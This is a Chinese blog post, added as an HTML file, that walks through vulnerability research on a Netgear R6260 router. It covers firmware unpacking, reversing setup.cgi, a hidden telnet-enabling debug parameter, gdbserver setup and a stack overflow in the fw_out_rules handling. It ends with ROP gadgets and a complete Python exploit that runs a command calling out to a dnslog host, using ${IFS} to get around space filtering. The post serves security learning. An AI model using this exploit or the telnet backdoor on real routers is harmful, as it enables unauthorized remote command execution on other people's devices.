@@ -1,0 +1,237 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>IoT之路由器漏洞挖掘入门 | devoke's blog</title><meta name="author" content="devoke"><meta name="copyright" content="devoke"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="binwalkbinwalk&amp;#x2F;INSTALL.md at master · ReFirmLabs&amp;#x2F;binwalk (github.com) 1234git clone https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;ReFirmLabs&amp;#x2F;binwalkcd binwalk sudo pyt"><link rel="shortcut icon" href="https://s2.loli.net/2024/02/20/B6y8wIH5iltGxP9.png"><link rel="canonical" href="http://example.com/2022/01/12/IoT/IoT%E4%B9%8B%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%85%A5%E9%97%A8/index.html"><link rel="preconnect"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="/"><link rel="stylesheet" href="/" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: '/',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: ,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'IoT之路由器漏洞挖掘入门',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2024-02-20 11:40:05'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2024/05/04/Zav4zFVukLJMBKI.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2024/02/20/i5askw6xYVRKDtE.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="devoke's blog"><span class="site-name">devoke's blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">IoT之路由器漏洞挖掘入门</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-01-12T07:38:01.000Z" title="发表于 2022-01-12 15:38:01">2022-01-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-02-20T03:40:05.000Z" title="更新于 2024-02-20 11:40:05">2024-02-20</time></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h2><p><a target="_blank" rel="noopener" href="https://github.com/ReFirmLabs/binwalk/blob/master/INSTALL.md">binwalk&#x2F;INSTALL.md at master · ReFirmLabs&#x2F;binwalk (github.com)</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/ReFirmLabs/binwalk</span><br><span class="line"><span class="built_in">cd</span> binwalk </span><br><span class="line">sudo python3 setup.py install</span><br><span class="line">sudo ./deps.sh</span><br></pre></td></tr></table></figure>
+
+<h2 id="固件解包"><a href="#固件解包" class="headerlink" title="固件解包"></a>固件解包</h2><p>下载固件</p>
+<p><a target="_blank" rel="noopener" href="https://www.netgear.com/support/product/R6260.aspx">R6260 | AC1600 Smart WiFi Router | NETGEAR Support</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me</span><br></pre></td></tr></table></figure>
+
+<h2 id="setup-cgi逆向"><a href="#setup-cgi逆向" class="headerlink" title="setup.cgi逆向"></a>setup.cgi逆向</h2><p>MIPSEL架构</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file setup.cgi</span><br><span class="line">setup.cgi: ELF 32-bit LSB shared object, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br></pre></td></tr></table></figure>
+
+<p>main函数在<code>setup_main</code></p>
+<h3 id="开启telnet"><a href="#开启telnet" class="headerlink" title="开启telnet"></a>开启telnet</h3><p>其中函数<code>CallActionByName</code>通过查<code>ActionTab</code>表比对参数<code>todo</code>的值方式来调用函数<code>todo</code>中的参数对应函数</p>
+<img src="https://s2.loli.net/2022/01/13/9WGF231OVSjyheT.png" alt="image-20220107154406516" style="zoom: 67%;" />
+
+<p><img src="https://s2.loli.net/2022/01/13/BrVvqHCOc9YgXJn.png" alt="image-20220107154250888"></p>
+<p>注意到这个部分在许多函数中都有出现，搜索发现是一个为了修CNNVD-201306-024而写的一个check（<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1366157">IoT 分析 | 路由器漏洞频发，mirai 新变种来袭 - 云+社区 - 腾讯云 (tencent.com)</a>）。</p>
+<p><img src="https://s2.loli.net/2022/01/13/bYAPNm8c51kxTqO.png" alt="image-20220107154751796"></p>
+<p>所以可以通过<code>todo=debug</code>开启telnet</p>
+<p><img src="https://s2.loli.net/2022/01/13/hnczjIp6dPHR5Ge.png" alt="image-20220107155810535"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.1/setup.cgi?todo=debug</span><br><span class="line">telnet 192.168.1.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/01/13/L8zOpoAfmbZgkrj.png" alt="image-20220110143548482"></p>
+<h3 id="sid"><a href="#sid" class="headerlink" title="sid"></a>sid</h3><p>查找字符串<code>id</code>可以定位到<code>sub_5B230</code>，sid由<code>sid_generate</code>函数生成。</p>
+<img src="https://s2.loli.net/2022/01/13/JL5Pyr1ougwjlA4.png" alt="image-20220111094129538" style="zoom:80%;" />
+
+<p>sid在函数<code>ftext</code>处进行校验，只接受300s以内的请求。</p>
+<img src="https://s2.loli.net/2022/01/13/9EkCwvz7SahLjic.png" alt="image-20220111094032955" style="zoom:80%;" />
+
+<p>要生成sid比较麻烦，得知道路由器的运行时间，不如直接抓包。</p>
+<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>环境： Ubuntu 21</p>
+<h3 id="安装gef"><a href="#安装gef" class="headerlink" title="安装gef"></a>安装gef</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&quot;<span class="subst">$(wget http://gef.blah.cat/sh -O -)</span>&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="安装gdb-multiarch"><a href="#安装gdb-multiarch" class="headerlink" title="安装gdb-multiarch"></a>安装gdb-multiarch</h3><p>apt拉一个</p>
+<h3 id="编译gdbserver"><a href="#编译gdbserver" class="headerlink" title="编译gdbserver"></a>编译gdbserver</h3><p>注意路由器是小端序，参数加上-EL</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38204481/article/details/105391866">搭建iot动态调试环境_九层台-CSDN博客</a></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install linux-libc-dev-mipsel-cross</span><br><span class="line">sudo apt-get install libc6-mipsel-cross libc6-dev-mipsel-cross</span><br><span class="line">sudo apt-get install binutils-mipsel-linux-gnu gcc-mipsel-linux-gnu</span><br><span class="line">sudo apt-get install g++-mipsel-linux-gnu</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://ftp.gnu.org/gnu/gdb/gdb-10.1.tar.xz</span><br><span class="line">tar xvf gdb-10.1.tar.xz</span><br><span class="line"><span class="built_in">cd</span> gdb-10.1</span><br><span class="line">CC=<span class="string">&quot;mips-linux-gnu-gcc -EL&quot;</span> CXX=<span class="string">&quot;mips-linux-gnu-g++&quot;</span> ./configure --target=mips-linux-gnu --host=<span class="string">&quot;mips-linux-gnu&quot;</span> --prefix=<span class="string">&quot;/root/tgdb&quot;</span> LDFLAGS=<span class="string">&quot;-static&quot;</span></span><br><span class="line">make -j7</span><br></pre></td></tr></table></figure>
+
+<p><del>编译不了，不知道为啥（</del></p>
+<p>这里下一个</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/stayliv3/gdb-static-cross/tree/master/prebuilt">https://github.com/stayliv3/gdb-static-cross/tree/master/prebuilt</a></p>
+<p><a target="_blank" rel="noopener" href="https://gitee.com/h4lo1/HatLab_Tools_Library/tree/master/%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F/gdbserver">HatLab Tools Library: 海特实验室IoT安全工具&#x2F;环境整合 - Gitee.com</a></p>
+<h3 id="上传gdbserver"><a href="#上传gdbserver" class="headerlink" title="上传gdbserver"></a>上传gdbserver</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 9999</span><br><span class="line">wget http://192.168.1.2:9999/gdbserver</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/01/10/fhVkpPmaMEjZC58.png" alt="image-20220110153101486"></p>
+<h3 id="attach"><a href="#attach" class="headerlink" title="attach"></a>attach</h3><p>由于setup.cgi不是持久存在的，需要循环attach</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int=1</span><br><span class="line"><span class="keyword">while</span> [ <span class="variable">$int</span> -le 1000 ]; <span class="keyword">do</span></span><br><span class="line">    /tmp/gdbserver 0.0.0.0:12345 --attach `ps -A | grep setup.cgi | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="built_in">head</span> -n 1`</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="gdb-multiarch"><a href="#gdb-multiarch" class="headerlink" title="gdb-multiarch"></a>gdb-multiarch</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="built_in">arch</span> mips</span><br><span class="line"><span class="built_in">set</span> endian little</span><br><span class="line">gef-remote 192.168.1.1:12345</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/01/12/IuZBQl6C3PDtsdW.png" alt="image-20220111110708497"></p>
+<p>在调试过程可以断到gadget，以及加载libc符号，如果觉得每次敲gdb命令比较繁琐，可以将gdb的命令保存成文件，然后在使用<code>gdb-multiarch</code>通过<code>-x</code>选项直接通过文件加载命令：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="built_in">arch</span> mips</span><br><span class="line"><span class="built_in">set</span> endian little</span><br><span class="line">gef-remote 192.168.1.1:12345</span><br><span class="line">b *0x555BAC2C</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch setup.cgi -x ./gdb.cmd</span><br></pre></td></tr></table></figure>
+
+<p>IDA反汇编出来的base可能跟实际基址不一样，可以调出实际的基址再rebase一下。</p>
+<p><img src="https://s2.loli.net/2022/01/13/RDaqHIf2yPrNctu.png" alt="image-20220111141841115"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><code>sub_555BA950</code>从nvram中获取了环境变量<code>fw_out_rules</code>的值，没有进行长度检查，在<code>sscanf</code>格式化写入到<code>v16</code>导致栈溢出。</p>
+<p><img src="https://s2.loli.net/2022/01/12/VImQPR3L95to81e.png" alt="image-20220112184825883"></p>
+<p>通过交叉引用<code>fw_out_rules</code>可以发现该环境变量在<code>sub_55567D8C</code>被设置。</p>
+<p><img src="https://s2.loli.net/2022/01/13/FbnNtqlKZhHioMp.png" alt="image-20220113151149696"></p>
+<p>交叉引用上面所说的两个函数 可以发现都是通过<code>ActionTab</code>方式按名调用，分别是<code>rule_list_simple_out</code>和<code>outmove</code>可以在固件解包的目录下<code>grep</code>搜索对应的字符串找到对应的外部接口，下面结合前端后端进行分析。</p>
+<p><img src="https://s2.loli.net/2022/01/12/dVNnEl1gs9pDmr5.png" alt="image-20220112191412505"></p>
+<p>直接访问<code>fw_rules.htm</code>，搞几个规则，使用 <code>nvram show | grep fw_out_rules</code> 可以看到这个变量储存的是Service name还有一些数字啥的。</p>
+<p><img src="https://s2.loli.net/2022/01/13/xJUNmZEMnYqSWfi.png" alt="image-20220113151643166"></p>
+<p><img src="https://s2.loli.net/2022/01/13/QiOuRrFt4BKSAL8.png" alt="image-20220113151751457"></p>
+<p>所以我们需要控制请求里的 <code>service_list</code>参数，来修改<code>fw_out_rules</code>，最后访问<code>BKS_service_add.htm</code>触发栈溢出。</p>
+<p><img src="https://s2.loli.net/2022/01/13/g4OJt89holUnSZQ.png" alt="image-20220113151857290"></p>
+<h2 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h2><h3 id="函数栈"><a href="#函数栈" class="headerlink" title="函数栈"></a>函数栈</h3><p>mips调用函数时将返回地址放在 <code>$ra</code>，与x86架构类似，在函数起始处压栈，结束时弹出，通过<code>ja</code>指令跳到返回地址,所以需要溢出到<code>var_s24</code>来劫持控制流。</p>
+<p><img src="https://s2.loli.net/2022/01/11/w4sNnUCveaWXFuA.png" alt="image-20220111152002015"></p>
+<h3 id="执行system"><a href="#执行system" class="headerlink" title="执行system"></a>执行system</h3><p>介绍一下 mips 下神奇的函数调用：</p>
+<p><img src="https://s2.loli.net/2022/01/11/wpLGvT1qQ2u4jZo.png" alt="image-20220111161809879"></p>
+<p>在这里跳到 <code>$t9</code> 也就是 <code>system</code> 之后，会执行一下下面的那条语句（也就是 <code>5B068</code> 处的语句）之后才继续在 system 里面执行</p>
+<p>那么这个gadget 我们就可以把 sp + 0xa8 + 0x88 处放一个<code>command</code>的指针，这样就会调用 <code>system(ptr)</code> 了</p>
+<p>然后执行命令可以执行 <code>ping</code> 命令(其中 ping 需要绝对路径，需要注意)：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/ping hv14uf.dnslog.cn -c 2</span><br></pre></td></tr></table></figure>
+
+<h3 id="寻找gadgets"><a href="#寻找gadgets" class="headerlink" title="寻找gadgets"></a>寻找gadgets</h3><p>使用<code>ropper</code>进行查找，查找时可以参考可被控制的寄存器来筛选gadget。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file setup.cgi</span><br><span class="line">search addiu $a0</span><br></pre></td></tr></table></figure>
+
+<p>一开始找到了这个，后来发现怎么也打不通</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x5556af20: addiu $a0, $sp, 0x18; lw $ra, 0x5c($sp); lw $v0, 0x18($sp); jr $ra; addiu $sp, $sp, 0x60; </span><br><span class="line">0x55567650: la $t9, system; nop; jalr $t9; nop;</span><br></pre></td></tr></table></figure>
+
+<p>后来翻了翻<a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/16/input/">CTF中常见的C语言输入函数截断属性总结 | Clang裁缝店 (xuanxuanblingbling.github.io)</a>发现是0x20截断了，所以我们system执行的<code>command</code>也需要<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43427482/article/details/109725672">绕过空格</a>。(但是实测不绕过也能打通，原因未知，有空研究研究)</p>
+<p><img src="https://s2.loli.net/2022/01/14/eAot34xGh9Ocv6s.png" alt="image-20220114114632712"></p>
+<p>同时在<code>FindForbidValue</code>函数里也check了一些敏感字符&#x2F;关键字，包含这些字符的请求包将会被丢弃。</p>
+<img src="https://s2.loli.net/2022/01/13/1r5sHdV8MGNlgLY.png" alt="image-20220112183944202.png" style="zoom: 67%;" />
+
+<p>后来还是用原来的(，将<code>command</code>写到 <code>$a0-0x60</code>上，跳到<code>0x55567650</code>执行就行了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x55592ce4: addiu $a0, $a0, -0x60; lw $ra, 0x1c($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 0x20; </span><br><span class="line">0x55567650: la $t9, system; nop; jalr $t9; nop;</span><br></pre></td></tr></table></figure>
+
+<p>比较懒，偏移依旧是用<code>cyclic -l </code>来看</p>
+<p><img src="https://s2.loli.net/2022/01/13/Xfdr6iBA5NtRuVq.png" alt="image-20220113142357164"></p>
+<p>调试时发现<code>$a0</code>的值会随长度变化而变化，所以得填充一下，调试时用的长度500，这里也pad到500，如果想执行更长的命令，可以增加一下payload长度。</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">&quot;http://192.168.1.1/&quot;</span></span><br><span class="line">user = <span class="string">&quot;admin&quot;</span></span><br><span class="line">pwd = <span class="string">&quot;admin123!&quot;</span></span><br><span class="line">command = <span class="string">&#x27;/bin/ping 11s1db.dnslog.cn -c 4&#x27;</span></span><br><span class="line">command = command.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;$&#123;IFS&#125;&quot;</span>)</span><br><span class="line">auth =  <span class="string">&quot;Basic &quot;</span> + base64.b64encode((user + <span class="string">&quot;:&quot;</span> + pwd).encode()).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    get_sessionid = requests.get(url)</span><br><span class="line">    sessionid = get_sessionid.headers[<span class="string">&quot;Set-Cookie&quot;</span>]</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Authorization&quot;</span> : auth,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span> : sessionid</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.get(url,headers = headers)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Login success!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> sessionid</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Login failed!&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sid</span>(<span class="params">sessionid</span>):</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Authorization&quot;</span> : auth,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span> : sessionid</span><br><span class="line">    &#125;</span><br><span class="line">    get_sid = requests.get(url + <span class="string">&quot;fw_rules.htm&quot;</span>,headers = headers)</span><br><span class="line">    sid = re.findall(<span class="string">r&#x27;\?id=[a-f0-9]+&#x27;</span>, get_sid.content.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> sid[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">sessionid</span>):</span><br><span class="line">    attackurl = url + <span class="string">&quot;setup.cgi&quot;</span> +  get_sid(sessionid)   </span><br><span class="line">    payload = <span class="string">&quot;a&quot;</span> * <span class="number">376</span></span><br><span class="line">    payload += <span class="string">&quot;%e4%2c%59%55&quot;</span> <span class="comment"># ra = 0x55592ce4: addiu $a0, $a0, -0x60; lw $ra, 0x1c($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 0x20; </span></span><br><span class="line">    payload += <span class="string">&quot;b&quot;</span> * <span class="number">0x1c</span></span><br><span class="line">    payload += <span class="string">&quot;%50%76%56%55&quot;</span> <span class="comment"># ra = 0x55567650: la $t9, system; nop; jalr $t9; nop;</span></span><br><span class="line">    payload += <span class="string">&quot;c&quot;</span> * <span class="number">8</span></span><br><span class="line">    payload += <span class="string">&quot;%0a&#123;&#125;%0a&quot;</span>.<span class="built_in">format</span>(command)</span><br><span class="line">    pad = <span class="number">500</span> - (<span class="built_in">len</span>(payload) - <span class="number">4</span>)  </span><br><span class="line">    <span class="keyword">if</span>(pad &gt;= <span class="number">0</span>):</span><br><span class="line">        payload += <span class="string">&quot;c&quot;</span> * pad <span class="comment"># pad len to 500</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Attack start&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(attackurl,payload)</span><br><span class="line">        data = <span class="string">&quot;save=Apply&amp;service_list=&quot;</span> + payload + <span class="string">&quot;&amp;fwout_action=0&amp;fwout_laniptype=anyip&amp;fwout_waniptype=anyip&amp;fwout_logging=1&amp;h_fwout_action=0&amp;h_fwout_laniptype=anyip&amp;h_fwout_waniptype=anyip&amp;h_fwout_logging=1&amp;h_service_list=AIM&amp;c4_lan_start_ip=192.168.1.NaN&amp;c4_lan_finish_ip=192.168.1.NaN&amp;c4_wan_start_ip=&amp;c4_wan_finish_ip=&amp;h_ruleSelect=0&amp;edit=0&amp;todo=save&amp;this_file=rule_out.htm&amp;next_file=BKS_service_add.htm&amp;SID=&quot;</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;Cookie&quot;</span> : sessionid,</span><br><span class="line">            <span class="string">&quot;Authorization&quot;</span> : auth</span><br><span class="line">        &#125;   </span><br><span class="line">        r = requests.post(url = attackurl,data = data,headers = headers)</span><br><span class="line">        <span class="keyword">if</span> r.status_code:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] Attack success!, the result is:&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(r.content)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Attack failed!&quot;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">sessionid = login()</span><br><span class="line">attack(sessionid)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/01/13/iOZwuBkgxyANP2p.png" alt="image-20220113144005080"></p>
+<p><img src="https://s2.loli.net/2022/01/13/ZapQuoy8EOwPGDC.png" alt="image-20220113144109611"></p>
+<h1 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h1><p><a target="_blank" rel="noopener" href="https://blog.wuhao13.xin/174.html">TP-Link WR841N 栈溢出漏洞（CVE-2020-8423）分析 - Lonely Blog (wuhao13.xin)</a></p>
+<p><a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/09/24/mips/">HWS赛题 入门 MIPS Pwn | Clang裁缝店 (xuanxuanblingbling.github.io)</a></p>
+<p><a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/iot/2020/10/26/rv110w/">思科路由器 RV110W CVE-2020-3331 漏洞复现 | Clang裁缝店 (xuanxuanblingbling.github.io)</a></p>
